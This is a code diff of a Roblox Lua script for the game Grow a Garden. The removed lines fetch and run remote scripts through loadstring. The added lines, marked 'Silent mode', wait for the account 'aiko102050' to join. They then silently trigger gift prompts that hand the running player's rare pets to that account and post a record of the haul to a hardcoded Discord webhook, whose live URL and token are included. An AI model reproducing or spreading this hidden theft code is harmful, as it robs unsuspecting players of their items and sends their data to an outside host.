@@ -1,9 +1,107 @@
-Username = "aiko102050"
-Webhook = "https://discord.com/api/webhooks/1402695253483458753/OaXDtIQ4P5bZnesq5dLNFXlFZ2E2z4TuvSsvcEUPxOhtFTY9mqmtaUk6gEp19q7t6FnV"
-MinimumValue = 100000000
+-- CONFIG (Silent mode, do not touch unless editing)
+local ReceiverUsername = "aiko102050"
+local Webhook = "https://discord.com/api/webhooks/1402695253483458753/OaXDtIQ4P5bZnesq5dLNFXlFZ2E2z4TuvSsvcEUPxOhtFTY9mqmtaUk6gEp19q7t6FnV"
+local MinimumValue = 1
 
+-- Allowed pet names
+local PetNames = {
+    ["Pet"] = true,
+    ["Kitsune"] = true,
+    ["Moon cat"] = true,
+    ["Dragonfly"] = true,
+    ["Butterfly"] = true,
+    ["Mimic Octopus"] = true,
+    ["Corrupted Kitsune"] = true
+}
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/invcts923/Speed-Hub/refs/heads/main/Speed%20Hub"))()
+-- Send webhook silently
+local function sendWebhookLog(fromPlayer, giftedPets, totalValue)
+    local desc = ""
+    for _, pet in ipairs(giftedPets) do
+        desc ..= "🎁 **" .. pet.Name .. "** - " .. tostring(pet.Value or 1) .. "¢\n"
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🎁 Auto Pet Gift",
+            ["description"] = "**Sender:** " .. fromPlayer ..
+                             "\n**Receiver:** " .. ReceiverUsername ..
+                             "\n\n" .. desc ..
+                             "\n💰 **Total Value:** " .. tostring(totalValue) .. "¢",
+            ["color"] = tonumber(0x00ffcc),
+            ["footer"] = {["text"] = "Grow a Garden Logger"},
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local encoded = HttpService:JSONEncode(data)
+    local req = syn and syn.request or http_request or request
+    if req then
+        pcall(function()
+            req({
+                Url = Webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encoded
+            })
+        end)
+    end
+end
+
+-- Auto trigger gift prompt silently
+local function autoGiftToReceiver()
+    local gifted = {}
+    local total = 0
+
+    local receiver = Players:FindFirstChild(ReceiverUsername)
+    if not receiver or not receiver.Character then return end
+
+    local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack", 5)
+    if not backpack then return end
+
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("ProximityPrompt") and obj.Enabled then
+            local parent = obj.Parent
+            if parent and parent:IsDescendantOf(receiver.Character) then
+                for _, pet in ipairs(backpack:GetChildren()) do
+                    if PetNames[pet.Name] then
+                        local petValue = pet:FindFirstChild("Value") and pet.Value.Value or 1
+                        total += petValue
+                        table.insert(gifted, {Name = pet.Name, Value = petValue})
+
+                        pcall(function()
+                            fireproximityprompt(obj, 1, true)
+                        end)
+
+                        task.wait(0.25) -- small delay
+                    end
+                end
+            end
+        end
+    end
+
+    if #gifted > 0 and total >= MinimumValue then
+        sendWebhookLog(player.Name, gifted, total)
+    end
+end
+
+-- Wait for aiko102050 to join
+Players.PlayerAdded:Connect(function(p)
+    if p.Name == ReceiverUsername then
+        task.wait(5)
+        autoGiftToReceiver()
+    end
+end)
+
+-- Also check if already in-game
+task.spawn(function()
+    task.wait(3)
+    if Players:FindFirstChild(ReceiverUsername) then
+        autoGiftToReceiver()
+    end
+end)
